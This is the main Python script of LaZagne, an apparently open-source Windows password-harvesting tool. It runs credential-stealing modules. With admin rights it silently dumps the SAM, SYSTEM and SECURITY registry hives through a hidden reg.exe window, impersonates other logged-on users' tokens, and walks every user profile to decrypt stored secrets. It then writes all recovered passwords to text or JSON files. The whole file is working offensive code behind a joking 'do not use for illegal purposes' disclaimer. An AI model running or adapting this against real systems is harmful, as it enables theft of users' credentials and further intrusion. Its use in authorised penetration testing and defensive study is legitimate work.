# -*- coding: utf-8 -*- 
#!/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)

# Configuration
from lazagne.config.write_output import parseJsonResultToBuffer, print_debug, StandartOutput
from lazagne.config.change_privileges import list_sids, rev2self, impersonate_sid_long_handle
from lazagne.config.manage_modules import get_categories, get_modules
from lazagne.config.dpapi_structure import *
from lazagne.config.constant import *
import subprocess
import _subprocess as sub
import traceback
import argparse
import logging
import getpass
import shutil
import time
import json
import ctypes
import sys
import os

# Useful for the pupy project
sys.setrecursionlimit(10000) # workaround to this error: RuntimeError: maximum recursion depth exceeded while calling a Python object

# Object used to manage the output / write functions (cf write_output file)
constant.st = StandartOutput()

# Tab containing all passwords
stdoutRes 	= []
modules 	= {}

# Define a dictionary for all modules
for category in get_categories():
	modules[category] = {}

# Add all modules to the dictionary
for module in get_modules():
	modules[module.category][module.options['dest']] = module

def output():
	if args['output']:
		if os.path.isdir(args['output']):
			constant.folder_name = args['output']
		else:
			print('[!] Specify a directory, not a file !')

	if args['write_normal']:
		constant.output = 'txt'
	
	if args['write_json']:
		constant.output = 'json'

	if args['write_all']:
		constant.output = 'all'

	if constant.output:
		if not os.path.exists(constant.folder_name):
			os.makedirs(constant.folder_name)
			# constant.file_name_results = 'credentials' # let the choice of the name to the user
		
		if constant.output != 'json':
			constant.st.write_header()

def quiet_mode():
	if args['quiet']:
		constant.quiet_mode = True

def verbosity():
	# Write on the console + debug file
	if 		args['verbose'] == 0: level = logging.CRITICAL
	elif 	args['verbose'] == 1: level = logging.INFO
	elif 	args['verbose'] >= 2: level = logging.DEBUG
	
	formatter 	= logging.Formatter(fmt='%(message)s')
	stream 		= logging.StreamHandler(sys.stdout)
	stream.setFormatter(formatter)
	root = logging.getLogger()
	root.setLevel(level)
	# If other logging are set
	for r in root.handlers:
		r.setLevel(logging.CRITICAL)
	root.addHandler(stream)
	del args['verbose']

def run_module(title, module):
	try:
		constant.st.title_info(title.capitalize()) 					# print title
		pwdFound = module.run(title.capitalize())					# run the module
		constant.st.print_output(title.capitalize(), pwdFound) 		# print the results
		
		# Return value - not used but needed
		yield True, title.capitalize(), pwdFound
	except:
		error_message = traceback.format_exc()
		print_debug('DEBUG', error_message)
		yield False, title.capitalize(), error_message

def launch_module(module, dpapi_used=True, registry_used=True, system_module=False):
	modulesToLaunch = []
	try:
		# Launch only a specific module
		for i in args:
			if args[i] and i in module:
				modulesToLaunch.append(i)
	except:
		# If no args
		pass

	# Launch all modules
	if not modulesToLaunch:
		modulesToLaunch = module

	for i in modulesToLaunch:

		if not dpapi_used and module[i].dpapi_used:
			continue

		if not registry_used and module[i].registry_used:
			continue

		if system_module ^ module[i].system_module:
			continue

		if module[i].exec_at_end:
			constant.module_to_exec_at_end.append(
				{
					'title'		: i,
					'module' 	: module[i],
				}
			)
			continue

		# Run module
		for m in run_module(title=i, module=module[i]):
			yield m


def manage_advanced_options():
	# i.e advanced options
	if 'historic' in args:
		constant.ie_historic = args['historic']

	if 'password' in args:
		constant.user_password = args['password']

# Run only one module
def runModule(category_choosed, dpapi_used=True, registry_used=True, system_module=False):
	constant.module_to_exec_at_end = []

	categories = [category_choosed] if category_choosed != 'all' else get_categories()
	for category in categories:
		for r in launch_module(modules[category], dpapi_used, registry_used, system_module):
			yield r

	if constant.module_to_exec_at_end:
		# These modules will need the windows user password to be able to decrypt dpapi blobs
		constant.dpapi = Decrypt_DPAPI(password=constant.user_password)
		# Add username to check username equals passwords
		constant.passwordFound.append(constant.username)
		constant.dpapi.check_credentials(constant.passwordFound)

		for module in constant.module_to_exec_at_end:
			for m in run_module(title=module['title'], module=module['module']):
				yield m

# Write output to file (json and txt files)
def write_in_file(result):
	if constant.output == 'json' or constant.output == 'all':
		try:
			# Human readable Json format
			prettyJson = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
			with open(os.path.join(constant.folder_name, constant.file_name_results + '.json'), 'a+b') as f:
				f.write(prettyJson.decode('unicode-escape').encode('UTF-8'))
			constant.st.do_print(u'[+] File written: {file}'.format(file=os.path.join(constant.folder_name, constant.file_name_results + '.json')))
		except Exception as e:
			print_debug('ERROR', u'Error writing the output file: {error}'.format(error=e))

	if constant.output == 'txt' or constant.output == 'all':
		try:
			with open(os.path.join(constant.folder_name, constant.file_name_results + '.txt'), 'a+b') as f:
				a = parseJsonResultToBuffer(result)
				f.write(a.encode("UTF-8"))
			constant.st.write_footer()
			constant.st.do_print(u'[+] File written: {file}'.format(file=os.path.join(constant.folder_name, constant.file_name_results + '.txt')))
		except Exception as e:
			print_debug('ERROR', u'Error writing the output file: {error}'.format(error=e))


# Get user list to retrieve  their passwords
def get_user_list_on_filesystem(impersonated_user=[]):
	
	# Check users existing on the system (get only directories)
	user_path = u'{drive}:\\Users'.format(drive=constant.drive)
	all_users = []
	if os.path.exists(user_path):
		all_users = os.listdir(user_path)
	
		# Remove default users
		for user in ['All Users', 'Default User', 'Default', 'Public', 'desktop.ini']:
			if user in all_users:
				all_users.remove(user)

		# Removing user that have already been impersonated
		for imper_user in impersonated_user:
			if imper_user in all_users:
				all_users.remove(imper_user)

	return all_users

def set_env_variables(user, toImpersonate=False):
	# Restore template path
	template_path = {
		'APPDATA'			: u'{drive}:\\Users\\{user}\\AppData\\Roaming\\',
		'USERPROFILE'		: u'{drive}:\\Users\\{user}\\',
		'HOMEDRIVE'			: u'{drive}:',
		'HOMEPATH'			: u'{drive}:\\Users\\{user}',
		'ALLUSERSPROFILE'	: u'{drive}:\\ProgramData', 
		'COMPOSER_HOME'		: u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Composer\\', 
		'LOCALAPPDATA'		: u'{drive}:\\Users\\{user}\\AppData\\Local',
	}

	constant.profile = template_path
	if not toImpersonate:
		# Get value from environment variables
		for env in constant.profile:
			if os.environ.get(env):
				constant.profile[env] = os.environ.get(env).decode(sys.getfilesystemencoding())

	# Replace "drive" and "user" with the correct values
	for env in constant.profile:
		constant.profile[env] = constant.profile[env].format(drive=constant.drive, user=user)

# Print user when verbose mode is enabled (without verbose mode the user is printed on the write_output python file)
def print_user(user):
	if logging.getLogger().isEnabledFor(logging.INFO) == True:
		constant.st.print_user(user)

def save_hives():
	for h in constant.hives:
		if not os.path.exists(constant.hives[h]):
			try:
				cmdline 			= 'reg.exe save hklm\%s %s' % (h, constant.hives[h])
				command 			= ['cmd.exe', '/c', cmdline]
				info 				= subprocess.STARTUPINFO()
				info.dwFlags 		= sub.STARTF_USESHOWWINDOW
				info.wShowWindow 	= sub.SW_HIDE
				p 			= subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
				results, _ 	= p.communicate()
			except Exception,e:
				print_debug('ERROR', u'Failed to save system hives: {error}'.format(error=e))
				return False
	return True

def clean_temporary_files():
	# Try to remove all temporary files
	for h in constant.hives:
		try:
			os.remove(constant.hives[h])
			print_debug('DEBUG', u'Temporary file removed: {filename}'.format(filename=constant.hives[h]))
		except:
			pass

def runLaZagne(category_choosed='all', password=None):

	# Useful if this function is called from another tool
	if password:
		constant.user_password = password

	# --------- Execute System modules ---------
	# First modules to execute 
	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
		if save_hives():
			# System modules (hashdump, lsa secrets, etc.)
			constant.username  		= 'SYSTEM'
			constant.finalResults 	= {'User': constant.username}
			
			if logging.getLogger().isEnabledFor(logging.INFO):
				constant.st.print_user(constant.username)
			yield 'User', constant.username
			for r in runModule(category_choosed, system_module=True, dpapi_used=False):
				yield r

			stdoutRes.append(constant.finalResults)
			clean_temporary_files()

	# ------ Part used for user impersonation ------ 

	constant.username = getpass.getuser().decode(sys.getfilesystemencoding())
	if not constant.username.endswith('$'):
		constant.finalResults 	= {'User': constant.username}
		print_user(constant.username)
		yield 'User', constant.username
		
		set_env_variables(user=constant.username)

		for r in runModule(category_choosed):
			yield r
		stdoutRes.append(constant.finalResults)

	# Check if admin to impersonate
	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
		
		# --------- Impersonation using tokens ---------
		
		sids 				= list_sids()
		impersonateUsers 	= {}
		impersonated_user 	= [constant.username]
		
		for sid in sids:
			# Not save the current user's SIDs and not impersonate system user
			if constant.username != sid[3].split('\\', 1)[1] and sid[2] != 'S-1-5-18':
				impersonateUsers.setdefault(sid[3].split('\\', 1)[1], []).append(sid[2])

		for user in impersonateUsers:
			if 'service' in user.lower().strip():
				continue
			
			# Do not impersonate the same user twice
			if user in impersonated_user: 
				continue

			print_user(user)
			yield 'User', user

			constant.finalResults = {'User': user}
			for sid in impersonateUsers[user]:
				try:
					set_env_variables(user, toImpersonate=True)
					impersonate_sid_long_handle(sid, close=False)
					impersonated_user.append(user)

					# Launch module wanted
					for r in runModule(category_choosed, registry_used=False):
						yield r
					
					rev2self()
					stdoutRes.append(constant.finalResults)
					break
				except Exception:
					print_debug('DEBUG', traceback.format_exc())

		# --------- Impersonation browsing file system ---------

		# Ready to check for all users remaining
		all_users = get_user_list_on_filesystem(impersonated_user)
		for user in all_users:
			# Fix value by default for user environnment (appdata and userprofile)
			set_env_variables(user, toImpersonate=True)
			print_user(user)
			
			constant.username 		= user
			constant.finalResults 	= {'User': user}
			yield 'User', user
			
			# Retrieve passwords that need high privileges
			for r in runModule(category_choosed, dpapi_used=False, registry_used=False):
				yield r
			
			stdoutRes.append(constant.finalResults)

if __name__ == '__main__':

	parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('-version', action='version', version='Version ' + str(constant.CURRENT_VERSION), help='laZagne version')

	# ------------------------------------------- Permanent options -------------------------------------------
	# Version and verbosity 
	PPoptional = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PPoptional._optionals.title = 'optional arguments'
	PPoptional.add_argument('-v', 		dest='verbose', 	action='count', 		default=0, 		help='increase verbosity level')
	PPoptional.add_argument('-quiet', 	dest='quiet', 		action='store_true', 	default=False, 	help='quiet mode: nothing is printed to the output')

	# Output 
	PWrite = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PWrite._optionals.title = 'Output'
	PWrite.add_argument('-oN', 		dest='write_normal', 	action='store_true', 	default=None, 	help='output file in a readable format')
	PWrite.add_argument('-oJ', 		dest='write_json', 		action='store_true', 	default=None, 	help='output file in a json format')
	PWrite.add_argument('-oA', 		dest='write_all', 		action='store_true', 	default=None, 	help='output file in both format')
	PWrite.add_argument('-output', 	dest='output',	 		action='store', 	 	default='.', 	help='destination path to store results (default:.)')

	# Windows user password 
	PPwd = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PPwd._optionals.title = 'Windows User Password'
	PPwd.add_argument('-password', dest='password', action='store', help='Windows user password (used to decrypt creds files)')
	
	# ------------------------------------------- Add options and suboptions to all modules -------------------------------------------
	all_subparser 	= []
	categories 		= get_categories()
	for c in categories:
		categories[c]['parser'] = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
		categories[c]['parser']._optionals.title = categories[c]['help']
		
		# Manage options
		categories[c]['subparser'] = []
		for module in modules[c].keys():
			m = modules[c][module]
			categories[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'], help=m.options['help'])
			
			# Manage all suboptions by modules
			if m.suboptions and m.name != 'thunderbird':
				tmp = []
				for sub in m.suboptions:
					tmp_subparser = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
					tmp_subparser._optionals.title = sub['title']
					if 'type' in sub:
						tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					else:
						tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					tmp.append(tmp_subparser)
					all_subparser.append(tmp_subparser)
				categories[c]['subparser'] += tmp

	# ------------------------------------------- Print all -------------------------------------------
	
	parents = [PPoptional] + all_subparser + [PPwd, PWrite]
	dic = {'all':{'parents':parents, 'help':'Run all modules', 'func': runModule}}
	for c in categories:
		parser_tab = [PPoptional, categories[c]['parser']]
		if 'subparser' in categories[c]:
			if categories[c]['subparser']:
				parser_tab += categories[c]['subparser']
		parser_tab += [PPwd, PWrite]
		dic_tmp = {c: {'parents': parser_tab, 'help':'Run %s module' % c, 'func': runModule}}
		dic = dict(dic.items() + dic_tmp.items())

	# Main commands
	subparsers = parser.add_subparsers(help='Choose a main command')
	for d in dic:
		subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(func=dic[d]['func'], auditType=d)

	# ------------------------------------------- Parse arguments -------------------------------------------

	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)

	args 				= dict(parser.parse_args()._get_kwargs())
	arguments 			= parser.parse_args()
	category_choosed 	= args['auditType']

	quiet_mode()

	# Print the title
	constant.st.first_title()

	# Define constant variables
	output()
	verbosity()
	manage_advanced_options()

	start_time = time.time()

	for r in runLaZagne(category_choosed):
		pass

	write_in_file(stdoutRes)
	constant.st.print_footer(elapsed_time=str(time.time() - start_time))